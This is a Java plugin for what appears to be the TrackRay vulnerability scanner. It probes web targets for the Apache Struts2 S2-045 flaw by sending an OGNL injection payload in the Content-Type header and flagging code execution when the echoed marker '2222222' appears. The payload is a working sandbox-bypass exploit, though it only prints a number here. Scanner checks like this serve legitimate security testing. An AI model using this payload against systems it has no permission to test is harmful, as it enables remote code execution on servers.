package com.trackray.module.crawler;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.Language;
import com.trackray.base.plugin.CrawlerPlugin;
import org.apache.commons.lang3.StringUtils;
import org.javaweb.core.net.HttpResponse;

import javax.servlet.http.HttpServletRequest;
import java.net.MalformedURLException;
import java.util.Arrays;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/16 15:31
 */
@Plugin(title = "Struts2 漏洞爬虫")
public class Struts2Crawler extends CrawlerPlugin {
    @Override
    public boolean check() {
        String path = target.getPath().toLowerCase();
        if (StringUtils.containsAny(path , ".do",".action",".jsp","shtml") || task.getResult().getSystemInfo().getLanguage() == Language.JAVA)
            return true;
        return false;
    }
    public static String payloadS2045 = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(2222221+1)).(#ros.flush())}";
    public static String flag = "2222222";

    @Override
    public void process() {


        HttpResponse resp = requests.url(target).contentType(payloadS2045).get();
        String body = resp.body();
        if (StringUtils.contains(body,flag)){
            addVulnerable(
                    Vulnerable.builder()
                            .address(target.toString())
                            .payload(payloadS2045)
                            .level(Vulnerable.Level.HIGH.getLevel())
                            .type(Vulnerable.Type.CODE_EXECUTION.getType())
                            .vulnId(Arrays.asList("S2-045"))
                            .build()
            );
        }

    }
}
